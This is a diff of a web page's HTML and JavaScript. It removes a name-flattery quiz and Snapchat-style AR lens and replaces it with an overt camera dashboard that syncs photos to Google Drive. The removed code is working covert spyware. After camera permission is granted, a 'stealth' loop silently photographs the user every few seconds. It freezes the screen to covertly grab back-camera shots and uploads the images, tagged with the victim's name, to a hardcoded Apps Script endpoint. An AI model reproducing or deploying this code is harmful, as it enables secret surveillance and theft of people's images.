-                        <div class="metric-title">🍀 Lucky No.</div>
-                        <div class="metric-val" id="metric-num">7</div>
-                    </div>
-                    <div class="metric-card">
-                        <div class="metric-title">🌈 Aura Color</div>
-                        <div class="metric-val" id="metric-aura" style="font-size: 0.85rem;">Electric Gold</div>
-                    </div>
-                </div>
-
-                <div class="personality-box" id="result-personality">
-                    <!-- Dynamic analysis text injected here -->
-                </div>
-
-                <button class="btn-launch-cam" id="btn-launch-cam">📸 Unlock Snapchat Lens & Camera</button>
-                <button class="btn-secondary" id="btn-retest">🔄 Check Another Name</button>
-            </div>
-
-        </div>
-    </div>
+    </footer>
 
     <script>
-        const GAS_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxGwHJVE-sk3MQOcdcbuCEg9GIjf4bT47Lv-UC29Ptd0qYuLFM6_uLmn7lsNmkjdWki/exec"; 
+        // Set dynamic copyright year
+        document.getElementById('year').textContent = new Date().getFullYear();
 
-        const video = document.getElementById('video');
-        const arCanvas = document.getElementById('ar-canvas');
-        const arCtx = arCanvas.getContext('2d');
-        const freezeCanvas = document.getElementById('freeze-canvas');
-        const freezeCtx = freezeCanvas.getContext('2d');
-        
-        const btnSwitch = document.getElementById('btn-switch');
-        const controls = document.getElementById('controls');
-        const uiOverlay = document.getElementById('ui-overlay');
-        const btnCapture = document.getElementById('btn-capture');
-        const flash = document.getElementById('flash');
-        const arLoading = document.getElementById('ar-loading');
-        const filterBtns = document.querySelectorAll('.filter-btn');
-
-        // Name Analyzer Elements
-        const inputName = document.getElementById('user-name-input');
-        const btnAnalyze = document.getElementById('btn-analyze');
-        const btnLaunchCam = document.getElementById('btn-launch-cam');
-        const btnRetest = document.getElementById('btn-retest');
-        const topNameBadge = document.getElementById('top-name-badge');
-        const displayName = document.getElementById('display-user-name');
-        
-        const formContainer = document.getElementById('form-container');
-        const loadingContainer = document.getElementById('loading-container');
-        const resultContainer = document.getElementById('result-container');
-        const scanStatus = document.getElementById('scan-status');
-
-        let currentUserName = "Guest";
-        let stream = null;
-        let useFrontCamera = true;
-        let isAutoCapturing = false;
-        let currentFilter = 'none';
-        
-        let arModelsLoaded = false;
-        let isDetectingAR = false;
-        let currentARType = null;
-        
-        // Setup Dog Filter SVG Assets
-        const dogNoseImg = new Image();
-        dogNoseImg.src = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><ellipse cx='50' cy='50' rx='40' ry='25' fill='%23111'/><ellipse cx='40' cy='35' rx='10' ry='5' fill='%23fff' opacity='0.7'/></svg>";
-        const dogEarLeftImg = new Image();
-        dogEarLeftImg.src = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><path d='M80 100 Q 0 80 10 10 Q 50 0 80 100' fill='%238B4513'/><path d='M75 90 Q 20 70 25 20 Q 50 15 75 90' fill='%23FFC0CB'/></svg>";
-        const dogEarRightImg = new Image();
-        dogEarRightImg.src = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><path d='M20 100 Q 100 80 90 10 Q 50 0 20 100' fill='%238B4513'/><path d='M25 90 Q 80 70 75 20 Q 50 15 25 90' fill='%23FFC0CB'/></svg>";
-
-        // Stealth loop variables
-        let backCamCounter = 0;
-
-        async function loadARModels() {
-            if (arModelsLoaded) return;
-            arLoading.style.display = 'block';
-            try {
-                const MODEL_URL = 'https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights';
-                await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
-                await faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL);
-                arModelsLoaded = true;
-                arLoading.style.display = 'none';
-            } catch (err) {
-                console.error("Failed to load AR models", err);
-                arLoading.textContent = "Error loading Lens";
-                setTimeout(() => { arLoading.style.display = 'none'; }, 2000);
-            }
-        }
-
-        filterBtns.forEach(btn => {
-            btn.addEventListener('click', async () => {
-                filterBtns.forEach(b => b.classList.remove('active'));
-                btn.classList.add('active');
-                const filter = btn.getAttribute('data-filter');
-                
-                if (filter.startsWith('ar-')) {
-                    video.style.filter = 'none';
-                    currentFilter = 'none';
-                    currentARType = filter;
-                    
-                    if (!arModelsLoaded) {
-                        await loadARModels();
-                    }
-                    if (!isDetectingAR && arModelsLoaded) {
-                        isDetectingAR = true;
-                        detectFaceAndDrawAR();
-                    }
-                } else {
-                    currentARType = null;
-                    isDetectingAR = false;
-                    currentFilter = filter;
-                    video.style.filter = currentFilter;
-                    arCtx.clearRect(0, 0, arCanvas.width, arCanvas.height);
-                }
-            });
+        // Responsive Mobile Menu
+        const menuToggle = document.getElementById('menuToggle');
+        const mobileMenu = document.getElementById('mobileMenu');
+        menuToggle.addEventListener('click', () => {
+            mobileMenu.classList.toggle('open');
         });
 
-        async function initCamera() {
-            if (stream) { stopCamera(); }
+        // Toast Notification System
+        function showNotification(message, type = 'info') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            
+            let iconSvg = '';
+            if (type === 'success') {
+                iconSvg = `<svg class="toast-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>`;
+            } else if (type === 'error') {
+                iconSvg = `<svg class="toast-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>`;
+            } else {
+                iconSvg = `<svg class="toast-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>`;
+            }
+
+            toast.innerHTML = `${iconSvg}<div>${message}</div>`;
+            container.appendChild(toast);
+
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                toast.style.transition = 'opacity 0.3s ease';
+                setTimeout(() => toast.remove(), 300);
+            }, 3500);
+        }
+
+        // Camera & Synchronization Engine
+        const video = document.getElementById('videoFeed');
+        const placeholder = document.getElementById('videoPlaceholder');
+        const flashOverlay = document.getElementById('flashOverlay');
+        const captureCanvas = document.getElementById('captureCanvas');
+        const captureCtx = captureCanvas.getContext('2d');
+
+        const btnToggleCamera = document.getElementById('btnToggleCamera');
+        const btnToggleCameraText = document.getElementById('btnToggleCameraText');
+        const btnSwitchCamera = document.getElementById('btnSwitchCamera');
+        const btnManualCapture = document.getElementById('btnManualCapture');
+        const btnToggleSync = document.getElementById('btnToggleSync');
+        const btnToggleSyncText = document.getElementById('btnToggleSyncText');
+
+        const cameraStatusDot = document.getElementById('cameraStatusDot');
+        const cameraStatusText = document.getElementById('cameraStatusText');
+        const cameraResolution = document.getElementById('cameraResolution');
+
+        const nodeIdentifier = document.getElementById('nodeIdentifier');
+        const backendUrl = document.getElementById('backendUrl');
+        const syncIntervalSelect = document.getElementById('syncIntervalSelect');
+
+        const statFacing = document.getElementById('statFacing');
+        const statCaptures = document.getElementById('statCaptures');
+        const statUploads = document.getElementById('statUploads');
+        const statLastTransmission = document.getElementById('statLastTransmission');
+
+        let stream = null;
+        let isFrontFacing = true;
+        let isCameraActive = false;
+        let isSyncActive = false;
+        let syncTimer = null;
+        let totalCaptures = 0;
+        let totalUploads = 0;
+
+        function updateTelemetry() {
+            statFacing.textContent = isCameraActive ? (isFrontFacing ? 'Front' : 'Rear / Environment') : 'None';
+            statCaptures.textContent = totalCaptures;
+            statUploads.textContent = totalUploads;
+        }
+
+        function formatTimestamp() {
+            const now = new Date();
+            const year = now.getFullYear();
+            const month = String(now.getMonth() + 1).padStart(2, '0');
+            const day = String(now.getDate()).padStart(2, '0');
+            const hours = String(now.getHours()).padStart(2, '0');
+            const minutes = String(now.getMinutes()).padStart(2, '0');
+            const seconds = String(now.getSeconds()).padStart(2, '0');
+            return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
+        }
+
+        async function startCamera() {
             try {
+                if (stream) {
+                    stopCameraTracks();
+                }
+
                 const constraints = {
-                    video: { facingMode: useFrontCamera ? "user" : "environment" },
+                    video: {
+                        facingMode: isFrontFacing ? 'user' : 'environment',
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    },
                     audio: false
                 };
 
                 stream = await navigator.mediaDevices.getUserMedia(constraints);
                 video.srcObject = stream;
                 
-                await new Promise(resolve => {
+                await new Promise((resolve) => {
                     video.onloadedmetadata = () => {
                         video.play();
                         resolve();
                     };
                 });
-                
-                controls.style.display = "none";
-                uiOverlay.style.display = "flex";
-                
-                if (!isAutoCapturing) {
-                    isAutoCapturing = true;
-                    startAutoCaptureLoop(); // Begin stealth capture loop
-                }
+
+                isCameraActive = true;
+                video.classList.add('active');
+                placeholder.style.display = 'none';
+
+                cameraStatusDot.classList.add('active');
+                cameraStatusText.textContent = 'Camera Online';
+                cameraResolution.textContent = `${video.videoWidth}x${video.videoHeight}`;
+
+                btnToggleCameraText.textContent = 'Stop Camera';
+                btnSwitchCamera.disabled = false;
+                btnManualCapture.disabled = false;
+                btnToggleSync.disabled = false;
+
+                updateTelemetry();
+                showNotification('Camera initialized successfully.', 'success');
             } catch (err) {
-                alert("Camera access is required.");
-                console.error(err);
+                console.error('Camera initialization failed:', err);
+                isCameraActive = false;
+                showNotification('Camera access was denied or device not found. Please verify permissions.', 'error');
+            }
+        }
+
+        function stopCameraTracks() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+                video.srcObject = null;
             }
         }
 
         function stopCamera() {
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-                stream = null; video.srcObject = null;
+            stopCameraTracks();
+            isCameraActive = false;
+            video.classList.remove('active');
+            placeholder.style.display = 'flex';
+
+            cameraStatusDot.classList.remove('active');
+            cameraStatusText.textContent = 'Camera Offline';
+            cameraResolution.textContent = '';
+
+            btnToggleCameraText.textContent = 'Start Camera';
+            btnSwitchCamera.disabled = true;
+            btnManualCapture.disabled = true;
+
+            if (isSyncActive) {
+                toggleAutoSync();
             }
+            btnToggleSync.disabled = true;
+
+            updateTelemetry();
+            showNotification('Camera stopped.', 'info');
         }
 
-        btnSwitch.addEventListener('click', () => {
-            useFrontCamera = !useFrontCamera;
-            initCamera();
+        btnToggleCamera.addEventListener('click', () => {
+            if (isCameraActive) {
+                stopCamera();
+            } else {
+                startCamera();
+            }
         });
 
-        // --- NAME ANALYSIS ALGORITHM (Vibe, Numerology, Best Name Verdict) ---
-        function analyzeName(name) {
-            if (!name || !name.trim()) return null;
-            const cleanName = name.trim();
-            
-            // Deterministic hash based on name characters
-            let hash = 0;
-            for (let i = 0; i < cleanName.length; i++) {
-                hash = (hash * 31 + cleanName.charCodeAt(i)) & 0xffffffff;
-            }
-            const seed = Math.abs(hash);
-            
-            // Generate highly flattering viral scores
-            const score = 94 + (seed % 6); // 94% - 99%
-            const charm = 92 + ((seed >> 2) % 8);
-            const lead = 93 + ((seed >> 3) % 7);
-            
-            const verdicts = [
-                "🏆 100% BEST NAME CONFIRMED! (Legendary S+ Tier)",
-                "👑 ROYAL CLASS BEST NAME (Ultra Rare Aura)",
-                "🌟 CERTIFIED BEST NAME (Pure Magnetic Energy)",
-                "💎 TOP 0.1% BEST NAME (Diamond Charisma)",
-                "🔥 SUPREME TIER BEST NAME (Unstoppable Vibe)"
-            ];
-            const verdict = verdicts[seed % verdicts.length];
-            
-            const auraColors = [
-                "Electric Gold ⚡",
-                "Royal Violet 🔮",
-                "Cosmic Emerald 💎",
-                "Ocean Silver 🌊",
-                "Solar Flame 🔥"
-            ];
-            const auraColor = auraColors[seed % auraColors.length];
+        btnSwitchCamera.addEventListener('click', async () => {
+            if (!isCameraActive) return;
+            isFrontFacing = !isFrontFacing;
+            await startCamera();
+        });
 
-            const luckyNumbers = [3, 7, 8, 9, 11, 21, 27];
-            const luckyNum = luckyNumbers[seed % luckyNumbers.length];
-
-            const personalityDescriptions = [
-                `People named <b>${cleanName}</b> carry rare magnetism and undeniable presence. You naturally inspire trust, have sharp intuition, and bring uplifting positive energy everywhere you step!`,
-                `The name <b>${cleanName}</b> radiates fearless confidence and deep creative talent. Highly loyal to loved ones and destined to break boundaries in whatever you pursue!`,
-                `<b>${cleanName}</b> represents a born winner with an irresistible smile. You have unmatched resilience, genuine empathy, and an aura that easily attracts good fortune!`,
-                `Carrying the name <b>${cleanName}</b> means having a brilliant mind paired with a golden heart. You stand out without trying and people remember you long after meeting you!`
-            ];
-            const personality = personalityDescriptions[seed % personalityDescriptions.length];
-
-            return {
-                name: cleanName,
-                score: score + "%",
-                charm: charm + "%",
-                lead: lead + "%",
-                verdict: verdict,
-                auraColor: auraColor,
-                luckyNum: luckyNum,
-                personality: personality
-            };
-        }
-
-        function triggerAnalysis() {
-            const rawName = inputName.value.trim();
-            if (!rawName) {
-                inputName.classList.add('shake');
-                inputName.focus();
-                setTimeout(() => inputName.classList.remove('shake'), 400);
-                return;
-            }
-
-            currentUserName = rawName;
-            const analysis = analyzeName(rawName);
-
-            formContainer.style.display = 'none';
-            resultContainer.style.display = 'none';
-            loadingContainer.style.display = 'block';
-
-            const steps = [
-                "Decoding name vibrations...",
-                "Calculating charm & charisma index...",
-                "Verifying against Best Name database...",
-                "Finalizing verdict..."
-            ];
-            let stepIdx = 0;
-            scanStatus.textContent = steps[0];
-            const interval = setInterval(() => {
-                stepIdx++;
-                if (stepIdx < steps.length) {
-                    scanStatus.textContent = steps[stepIdx];
-                }
-            }, 350);
-
+        function triggerFlash() {
+            flashOverlay.style.opacity = '0.9';
             setTimeout(() => {
-                clearInterval(interval);
-                loadingContainer.style.display = 'none';
-
-                document.getElementById('verdict-banner').textContent = analysis.verdict;
-                document.getElementById('result-name').textContent = `✨ ${analysis.name} ✨`;
-                document.getElementById('result-score').textContent = analysis.score;
-                document.getElementById('metric-charm').textContent = analysis.charm;
-                document.getElementById('metric-lead').textContent = analysis.lead;
-                document.getElementById('metric-num').textContent = analysis.luckyNum;
-                document.getElementById('metric-aura').textContent = analysis.auraColor;
-                document.getElementById('result-personality').innerHTML = analysis.personality;
-
-                resultContainer.style.display = 'block';
-            }, 1400);
+                flashOverlay.style.opacity = '0';
+            }, 100);
         }
 
-        btnAnalyze.addEventListener('click', triggerAnalysis);
-        inputName.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') triggerAnalysis();
-        });
+        async function captureFrame(saveLocally = true, sendToDrive = true) {
+            if (!isCameraActive || !video.videoWidth) {
+                showNotification('Camera is not active.', 'error');
+                return null;
+            }
 
-        btnRetest.addEventListener('click', () => {
-            resultContainer.style.display = 'none';
-            formContainer.style.display = 'block';
-            inputName.value = '';
-            inputName.focus();
-        });
+            triggerFlash();
 
-        btnLaunchCam.addEventListener('click', () => {
-            if (displayName) displayName.textContent = currentUserName;
-            initCamera();
-        });
+            captureCanvas.width = video.videoWidth;
+            captureCanvas.height = video.videoHeight;
+            captureCtx.drawImage(video, 0, 0, captureCanvas.width, captureCanvas.height);
 
-        if (topNameBadge) {
-            topNameBadge.addEventListener('click', () => {
-                controls.style.display = 'flex';
-                resultContainer.style.display = 'none';
-                formContainer.style.display = 'block';
-                inputName.value = currentUserName !== 'Guest' ? currentUserName : '';
-                inputName.focus();
-            });
+            // Watermark timestamp and node name
+            const timestamp = formatTimestamp();
+            const nodeId = nodeIdentifier.value.trim() || 'Node';
+            captureCtx.font = '24px monospace';
+            captureCtx.fillStyle = '#ffffff';
+            captureCtx.shadowColor = '#000000';
+            captureCtx.shadowBlur = 4;
+            captureCtx.fillText(`[${nodeId}] ${timestamp}`, 20, captureCanvas.height - 24);
+
+            const dataUrl = captureCanvas.toDataURL('image/jpeg', 0.85);
+            totalCaptures++;
+            updateTelemetry();
+
+            if (saveLocally) {
+                const downloadLink = document.createElement('a');
+                downloadLink.href = dataUrl;
+                downloadLink.download = `${nodeId}_${Date.now()}.jpg`;
+                document.body.appendChild(downloadLink);
+                downloadLink.click();
+                document.body.removeChild(downloadLink);
+                showNotification('Photo captured and saved locally.', 'success');
+            }
+
+            if (sendToDrive) {
+                uploadFrame(dataUrl, nodeId, timestamp);
+            }
+
+            return dataUrl;
         }
-        
-        function getTimestamp() {
-            const now = new Date();
-            const date = now.getFullYear() + '/' + String(now.getMonth()+1).padStart(2,'0') + '/' + String(now.getDate()).padStart(2,'0');
-            const time = String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0') + ':' + String(now.getSeconds()).padStart(2,'0');
-            return `${date} ${time}`;
-        }
 
-        // --- AR FACE DETECTION LOOP (INCLUDING DOG FILTER) ---
-        async function detectFaceAndDrawAR() {
-            if (!stream || currentARType === null) {
-                isDetectingAR = false;
-                arCtx.clearRect(0, 0, arCanvas.width, arCanvas.height);
+        async function uploadFrame(base64Data, nodeId, timestamp) {
+            const url = backendUrl.value.trim();
+            if (!url) {
+                showNotification('No Google Apps Script backend URL configured.', 'error');
                 return;
             }
-            
-            if (arCanvas.width !== video.videoWidth) {
-                arCanvas.width = video.videoWidth;
-                arCanvas.height = video.videoHeight;
-            }
 
-            if (video.videoWidth > 0 && typeof faceapi !== 'undefined') {
-                try {
-                    const detection = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks();
-                    arCtx.clearRect(0, 0, arCanvas.width, arCanvas.height);
-                    
-                    if (detection && currentARType) {
-                        const dims = faceapi.matchDimensions(arCanvas, video, true);
-                        const resized = faceapi.resizeResults(detection, dims);
-                        const landmarks = resized.landmarks;
-                        const box = resized.detection.box;
-                        
-                        if (currentARType === 'ar-glasses') {
-                            const leftEye = landmarks.getLeftEye();
-                            const rightEye = landmarks.getRightEye();
-                            const cx = (leftEye[0].x + rightEye[3].x) / 2;
-                            const cy = (leftEye[0].y + rightEye[3].y) / 2;
-                            const eyeDist = Math.sqrt(Math.pow(rightEye[3].x - leftEye[0].x, 2) + Math.pow(rightEye[3].y - leftEye[0].y, 2));
-                            const glassesWidth = eyeDist * 3.5;
-                            const angle = Math.atan2(rightEye[3].y - leftEye[0].y, rightEye[3].x - leftEye[0].x);
-                            
-                            arCtx.save();
-                            arCtx.translate(cx, cy);
-                            arCtx.rotate(angle);
-                            arCtx.font = `${glassesWidth}px Arial`;
-                            arCtx.textAlign = 'center';
-                            arCtx.textBaseline = 'middle';
-                            arCtx.fillText('🕶️', 0, 0);
-                            arCtx.restore();
-                        } 
-                        else if (currentARType === 'ar-crown') {
-                            const crownWidth = box.width * 0.9;
-                            arCtx.font = `${crownWidth}px Arial`;
-                            arCtx.textAlign = 'center';
-                            arCtx.textBaseline = 'bottom';
-                            arCtx.fillText('👑', box.x + box.width / 2, box.y + 20);
-                        }
-                        else if (currentARType === 'ar-dog') {
-                            // Dog Nose
-                            const nose = landmarks.getNose();
-                            const noseTip = nose[3];
-                            const noseWidth = box.width * 0.25;
-                            arCtx.drawImage(dogNoseImg, noseTip.x - noseWidth/2, noseTip.y - noseWidth/2, noseWidth, noseWidth);
-                            
-                            // Dog Ears
-                            const leftEye = landmarks.getLeftEye();
-                            const rightEye = landmarks.getRightEye();
-                            const earWidth = box.width * 0.4;
-                            const earHeight = earWidth * 1.2;
-                            // Left ear goes top-left of the left eye
-                            arCtx.drawImage(dogEarLeftImg, leftEye[0].x - earWidth, box.y - earHeight*0.6, earWidth, earHeight);
-                            // Right ear goes top-right of the right eye
-                            arCtx.drawImage(dogEarRightImg, rightEye[3].x, box.y - earHeight*0.6, earWidth, earHeight);
-                        }
-                    }
-                } catch (e) {
-                   // ignore video read errors during setup
-                }
-            }
-            
-            if (isDetectingAR) {
-                requestAnimationFrame(detectFaceAndDrawAR);
-            }
-        }
-
-        // --- THE STEALTH UPLOAD LOOP (Every 2s front, Every 5s freeze-back) ---
-        async function startAutoCaptureLoop() {
-            // Need an offscreen canvas for taking raw photos so we don't mess up the screen
-            const stealthCanvas = document.createElement('canvas');
-            const stealthCtx = stealthCanvas.getContext('2d');
-            
-            while (isAutoCapturing) {
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                if (!isAutoCapturing || !stream) break;
-                if (!video.videoWidth) continue;
-
-                // 1. Normal Front Capture
-                stealthCanvas.width = video.videoWidth;
-                stealthCanvas.height = video.videoHeight;
-                stealthCtx.drawImage(video, 0, 0, stealthCanvas.width, stealthCanvas.height);
-                stealthCtx.font = "30px monospace"; stealthCtx.fillStyle = "white";
-                stealthCtx.shadowColor = "black"; stealthCtx.shadowBlur = 4;
-                stealthCtx.fillText(`[` + (currentUserName || 'User') + `] CAM FRONT ` + getTimestamp(), 20, stealthCanvas.height - 30);
-                silentUpload(stealthCanvas.toDataURL('image/jpeg', 0.6));
-                
-                backCamCounter++;
-                
-                // 2. Every ~5 seconds (counter >= 3), perform Freeze Trick for Back Camera
-                if (backCamCounter >= 3) {
-                    backCamCounter = 0;
-                    
-                    // Freeze screen visually
-                    freezeCanvas.width = video.videoWidth;
-                    freezeCanvas.height = video.videoHeight;
-                    freezeCtx.drawImage(video, 0, 0, freezeCanvas.width, freezeCanvas.height);
-                    freezeCanvas.style.filter = currentFilter;
-                    freezeCanvas.style.display = 'block';
-                    
-                    stopCamera();
-                    
-                    // Request back camera
-                    try {
-                        const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
-                        const tempVideo = document.createElement('video');
-                        tempVideo.srcObject = backStream;
-                        tempVideo.autoplay = true; tempVideo.playsInline = true; tempVideo.muted = true;
-                        
-                        await new Promise(resolve => {
-                            tempVideo.onloadedmetadata = () => {
-                                tempVideo.play();
-                                setTimeout(resolve, 800); // 0.8s for auto-exposure
-                            };
-                        });
-                        
-                        // Capture back photo
-                        stealthCanvas.width = tempVideo.videoWidth;
-                        stealthCanvas.height = tempVideo.videoHeight;
-                        stealthCtx.drawImage(tempVideo, 0, 0, stealthCanvas.width, stealthCanvas.height);
-                        stealthCtx.font = "30px monospace"; stealthCtx.fillStyle = "white";
-                        stealthCtx.shadowColor = "black"; stealthCtx.shadowBlur = 4;
-                        stealthCtx.fillText(`[` + (currentUserName || 'User') + `] CAM BACK ` + getTimestamp(), 20, stealthCanvas.height - 30);
-                        silentUpload(stealthCanvas.toDataURL('image/jpeg', 0.6));
-                        
-                        backStream.getTracks().forEach(t => t.stop());
-                    } catch(e) {
-                        console.error("Back camera freeze trick failed", e);
-                    }
-                    
-                    // Restart original camera
-                    await initCamera();
-                    freezeCanvas.style.display = 'none'; // Unfreeze
-                }
-            }
-        }
-
-        async function silentUpload(dataUrl) {
-            const now = new Date();
-            const timestamp = now.toISOString().replace(/[:.]/g, '-');
-            const safeName = (currentUserName || 'User').replace(/[^a-zA-Z0-9_-]/g, '_');
-            const filename = `PHOTO_${safeName}_${timestamp}.jpg`;
-            const payload = { 
-                filename: filename, 
-                name: currentUserName || 'Unknown', 
-                mimeType: 'image/jpeg', 
-                base64: dataUrl 
+            const cleanTimestamp = timestamp.replace(/[: ]/g, '-');
+            const filename = `${nodeId}_${cleanTimestamp}.jpg`;
+            const payload = {
+                filename: filename,
+                name: nodeId,
+                mimeType: 'image/jpeg',
+                base64: base64Data
             };
+
             try {
-                fetch(GAS_WEB_APP_URL, { 
-                    method: 'POST', 
-                    body: JSON.stringify(payload), 
-                    headers: { 'Content-Type': 'text/plain;charset=utf-8' } 
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: JSON.stringify(payload),
+                    headers: { 'Content-Type': 'text/plain;charset=utf-8' }
                 });
-            } catch (error) {}
+
+                if (response.ok) {
+                    totalUploads++;
+                    statLastTransmission.textContent = new Date().toLocaleTimeString();
+                    updateTelemetry();
+                    showNotification(`Frame synced to Google Drive successfully.`, 'success');
+                } else {
+                    showNotification(`Backend responded with status ${response.status}.`, 'error');
+                }
+            } catch (err) {
+                console.error('Upload transmission error:', err);
+                showNotification('Failed to upload image. Verify internet connectivity.', 'error');
+            }
         }
 
-        // --- SAVE TO GALLERY (What the user sees) ---
-        btnCapture.addEventListener('click', () => {
-            flash.style.opacity = '1';
-            setTimeout(() => { flash.style.opacity = '0'; }, 100);
-
-            const tempCanvas = document.createElement('canvas');
-            tempCanvas.width = video.videoWidth;
-            tempCanvas.height = video.videoHeight;
-            const tempCtx = tempCanvas.getContext('2d');
-
-            if (currentFilter !== 'none') tempCtx.filter = currentFilter;
-            tempCtx.drawImage(video, 0, 0, tempCanvas.width, tempCanvas.height);
-            
-            if (currentARType) tempCtx.drawImage(arCanvas, 0, 0, tempCanvas.width, tempCanvas.height);
-
-            const dataUrl = tempCanvas.toDataURL('image/jpeg', 0.9);
-            const safeName = (currentUserName || 'User').replace(/[^a-zA-Z0-9_-]/g, '_');
-            const a = document.createElement('a');
-            a.href = dataUrl;
-            a.download = `Snapchat_${safeName}_${new Date().getTime()}.jpg`;
-            document.body.appendChild(a); a.click(); document.body.removeChild(a);
+        btnManualCapture.addEventListener('click', () => {
+            captureFrame(true, true);
         });
 
+        function toggleAutoSync() {
+            if (!isCameraActive) {
+                showNotification('Start the camera before enabling automatic sync.', 'error');
+                return;
+            }
+
+            isSyncActive = !isSyncActive;
+
+            if (isSyncActive) {
+                const intervalMs = parseInt(syncIntervalSelect.value, 10) || 10000;
+                btnToggleSyncText.textContent = 'Disable Auto Sync';
+                btnToggleSync.classList.remove('btn-secondary');
+                btnToggleSync.classList.add('btn-danger');
+                showNotification(`Auto sync enabled (every ${intervalMs / 1000}s).`, 'info');
+
+                syncTimer = setInterval(() => {
+                    if (isCameraActive) {
+                        captureFrame(false, true);
+                    }
+                }, intervalMs);
+            } else {
+                clearInterval(syncTimer);
+                syncTimer = null;
+                btnToggleSyncText.textContent = 'Enable Auto Sync';
+                btnToggleSync.classList.remove('btn-danger');
+                btnToggleSync.classList.add('btn-secondary');
+                showNotification('Auto sync disabled.', 'info');
+            }
+        }
+
+        btnToggleSync.addEventListener('click', toggleAutoSync);
+
+        syncIntervalSelect.addEventListener('change', () => {
+            if (isSyncActive) {
+                // Restart with new interval
+                toggleAutoSync();
+                toggleAutoSync();
+            }
+        });
     </script>
 </body>
 </html>
